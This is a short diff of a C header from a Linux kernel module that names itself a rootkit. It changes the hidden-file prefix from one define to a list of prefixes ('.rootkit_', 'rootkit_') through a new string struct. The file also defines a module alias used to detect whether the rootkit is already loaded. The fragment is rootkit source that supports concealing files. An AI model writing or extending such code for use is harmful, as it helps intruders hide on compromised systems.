@@ -4,9 +4,14 @@
 #include <linux/types.h>
 #include <vdso/limits.h>
 
-#define __HIDDEN_PREFIX   ".rootkit_"                   /* Prefix for hidden files/directories */
-#define HIDDEN_PREFIX_LEN (sizeof(__HIDDEN_PREFIX) - 1) /* Length of the prefix */
-extern const char S_HIDDEN_PREFIX[];                    // Prefix for hidden files/directories
+typedef struct string_tag {
+    const char *const s_str; // String value
+    const size_t sz_len;     // String length
+} string_t;
+
+extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/directories
+
+#define HIDDEN_PREFIXES ".rootkit_", "rootkit_" /* List of prefixes for hidden files/directories */
 
 #define MOD_ALIAS ".rootkit" /* Module alias (to check if rootkit is already loaded) */
 
